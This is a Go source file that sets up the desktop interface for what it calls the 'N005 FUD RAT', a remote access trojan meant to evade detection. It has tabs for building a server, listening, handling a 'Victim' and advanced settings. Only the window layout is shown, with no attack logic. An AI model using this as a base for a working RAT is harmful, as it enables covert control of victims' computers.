package main

import (
	"fmt"
	"net/url"

	"hack/server_gui/screens"

	"fyne.io/fyne"
	"fyne.io/fyne/app"
	"fyne.io/fyne/canvas"
	"fyne.io/fyne/layout"
	"fyne.io/fyne/theme"
	"fyne.io/fyne/widget"
)

func client(a fyne.App) fyne.CanvasObject {
	logo := canvas.NewImageFromResource(theme.FyneLogo())
	logo.SetMinSize(fyne.NewSize(128, 128))

	link, err := url.Parse("https://epcminecraft.fr.gd/")
	if err != nil {
		fyne.LogError("Could not parse URL", err)
	}

	return widget.NewVBox(
		widget.NewLabelWithStyle("Welcome to the N005 FUD RAT !", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
		layout.NewSpacer(),
		widget.NewHBox(layout.NewSpacer(), logo, layout.NewSpacer()),
		widget.NewHyperlinkWithStyle("n005.fr", link, fyne.TextAlignCenter, fyne.TextStyle{}),
		layout.NewSpacer(),

		widget.NewGroup("Credit",
			fyne.NewContainerWithLayout(layout.NewGridLayout(2),
				widget.NewLabelWithStyle("©N005 2019", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
			),
		),
	)
}

func main() {
	app := app.New()

	//app.Settings().SetTheme(theme.DarkTheme())

	w := app.NewWindow("Let's golang RAT !")

	w.Resize(fyne.NewSize(512, 341))

	w.SetMainMenu(fyne.NewMainMenu(fyne.NewMenu("File",
		fyne.NewMenuItem("New", func() { fmt.Println("Menu New") }),
		// a quit item will be appended to our first menu
	), fyne.NewMenu("About",
		fyne.NewMenuItem("About", func() { fmt.Println("Menu About") }),
	)))

	tabs := widget.NewTabContainer(
		widget.NewTabItemWithIcon("Welcome", theme.HomeIcon(), client(app)),
		widget.NewTabItemWithIcon("Build server", theme.DocumentCreateIcon(), screens.Build()),
		widget.NewTabItemWithIcon("Listener", theme.MailForwardIcon(), screens.Listener()),
		widget.NewTabItemWithIcon("Victim", theme.SearchIcon(), screens.Rat()),
		widget.NewTabItemWithIcon("Advanced", theme.SettingsIcon(), screens.Settings()))
	tabs.SetTabLocation(widget.TabLocationLeading)
	w.SetContent(tabs)

	w.SetContent(tabs)

	w.ShowAndRun()
}
